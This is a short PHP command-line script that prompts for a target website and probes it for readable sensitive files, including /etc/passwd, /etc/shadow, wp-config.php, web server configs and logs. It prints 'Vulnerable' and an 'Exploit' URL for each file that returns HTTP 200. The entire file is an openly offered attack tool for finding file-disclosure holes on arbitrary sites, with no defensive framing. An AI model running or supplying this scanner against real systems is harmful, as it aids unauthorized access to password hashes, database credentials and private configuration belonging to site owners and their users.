<?php
// Function to display colored text
function colorize($text, $color) {
    $colors = [
        'red' => '0;31', 'green' => '0;32', 'yellow' => '1;33',
        'blue' => '0;34', 'magenta' => '0;35', 'cyan' => '0;36',
        'light_gray' => '0;37', 'dark_gray' => '1;30', 'light_red' => '1;31',
        'light_green' => '1;32', 'light_blue' => '1;34', 'light_magenta' => '1;35',
        'light_cyan' => '1;36', 'white' => '1;37'
    ];
    return "\033[" . $colors[$color] . "m" . $text . "\033[0m";
}

// Function to check if a URL is reachable
function isUrlReachable($url) {
    $headers = @get_headers($url);
    return $headers && strpos($headers[0], '200');
}

echo colorize("Enter your target website URL: ", 'cyan');
$target_url = trim(fgets(STDIN));

echo "Attempting to read sensitive files...\n";

// List of common sensitive files to test
$files_to_test = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/resolv.conf',
    '/etc/apache2/apache2.conf',
    '/etc/apache2/sites-available/000-default.conf',
    '/etc/nginx/nginx.conf',
    '/etc/nginx/sites-available/default',
    '/etc/mysql/my.cnf',
    '/etc/php.ini',
    '/var/www/html/index.php',
    '/var/www/html/config.php',
    '/var/www/html/wp-config.php',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/mysql/error.log'
];

foreach ($files_to_test as $file) {
    $url = $target_url . $file;
    if (isUrlReachable($url)) {
        echo colorize("Vulnerable: $file is readable.\n", 'red');
        echo "Exploit: $url\n";
    } else {
        echo colorize("Not vulnerable: $file is not readable.\n", 'green');
    }
}
?>
